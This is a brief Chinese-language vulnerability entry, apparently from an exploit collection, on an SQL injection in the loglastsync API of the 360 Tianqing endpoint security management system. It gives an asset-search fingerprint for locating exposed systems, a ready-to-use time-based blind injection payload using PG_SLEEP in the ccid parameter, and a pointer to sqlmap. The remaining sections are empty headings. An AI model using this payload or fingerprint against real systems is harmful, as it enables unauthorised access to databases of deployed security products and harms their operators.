# 360天擎终端安全管理系统loglastsync存在SQL注入漏洞

- **系统**：360天擎终端安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="天擎终端安全管理系统"`

**请求体 / payload**
```
/api/dp/loglastsync?ccid=1') AND 9421=(SELECT 9421 FROM PG_SLEEP(5)) AND ('crvL'='crvL

sqlmap
/api/dp/loglastsync?ccid=1
```

**其他**
- 360天擎终端安全管理系统loglastsync存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 360天擎终端安全管理系统